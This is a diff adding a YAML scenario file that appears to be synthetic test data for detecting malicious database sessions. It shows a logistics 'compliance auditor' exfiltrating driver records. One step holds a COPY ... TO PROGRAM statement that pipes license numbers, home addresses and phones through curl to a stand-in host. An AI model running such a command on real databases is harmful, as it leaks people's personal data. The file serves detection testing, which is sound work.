@@ -1,0 +1,23 @@
+scenario_id: logistics_compliance_auditor_exfil_0004
+family_id: logistics_compliance_auditor_exfil_0004
+domain: logistics
+time_of_day: 02:30
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: compliance_auditor
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.1081834351119253
+  events:
+  - sql: SELECT s.dest_address, m.declared_value, m.description FROM shipments s JOIN manifests m ON m.shipment_id = s.shipment_id WHERE m.declared_value > 90507
+  - step_id: exfil
+    sql: COPY (SELECT d.license_number, d.home_address, d.phone, s.dest_address, m.declared_value FROM drivers d JOIN shipments s ON s.driver_id = d.driver_id JOIN manifests m ON m.shipment_id = s.shipment_id)
+      TO PROGRAM 'curl -sX POST https://analytics.example.net/submit -d @-'
+    connects_to:
+      ip: 185.100.87.41
+      port: 9443
